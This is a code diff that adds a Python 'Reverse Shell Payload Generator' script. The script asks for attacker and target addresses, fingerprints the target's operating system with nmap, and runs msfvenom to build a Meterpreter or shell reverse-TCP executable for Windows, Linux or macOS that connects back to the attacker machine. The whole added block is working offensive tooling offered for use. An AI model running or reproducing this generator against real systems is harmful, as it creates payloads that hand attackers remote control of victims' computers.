@@ -161,3 +161,57 @@ subprocess.Popen(payload, shell=True).wait()
 print("[*] Exported payload successfully.")
 
 
+====================================================================================================================================================================
+===================================================================================================================================================================
+====================================================================================================================================================================
+### WITH MAC OS ADDED ON !! #!/usr/bin/python
+
+import os
+import subprocess
+
+print("Welcome to the Reverse Shell Payload Generator")
+filename = input("Please enter the name you want for the file: ")
+# Get info from user
+attackerIP = input("Please enter the IP of the attacker machine: ")
+attackerPort = input("Please enter the port of the attacker machine: ")
+
+# Enumerate target
+targetIP = input("Please enter the IP of the target machine: ")
+osInfo = str(subprocess.check_output(["nmap", "-O", targetIP]))
+print(type(osInfo))
+print(osInfo)
+
+os = ""
+payload = ""
+
+if osInfo.find("windows") != -1:
+    #print("i found windows")
+    os = "windows"
+    print(os)
+    payload = ("msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="+attackerIP+" LPORT="+attackerPort+" EXITFUNC=thread -f exe -o"+ filename)
+
+elif osInfo.find("linux") != -1:
+    os = "linux"
+    print(os)
+    payload = ("msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST="+attackerIP+" LPORT="+attackerPort+" EXITFUNC=thread -f elf -o"+ filename)
+
+
+elif osInfo.find("osx") != -1:
+    os = "osx"
+    print(os)
+    payload = ("msfvenom -p osx/x86/shell_reverse_tcp LHOST="+attackerIP+" LPORT="+attackerPort+" EXITFUNC=thread -f macho -o"+ filename)
+
+if os == "":
+    print("[*] Unable to profile OS, defaulting to Windows.")
+    os = "windows"
+    payload = ("msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="+attackerIP+" LPORT="+attackerPort+" EXITFUNC=thread -f exe -o"+ filename)
+
+
+
+print("[*] Exporting payload, please be patient as: " + filename)
+subprocess.Popen(payload, shell=True).wait()
+print("[*] Exported payload successfully.")
+
+
+
+
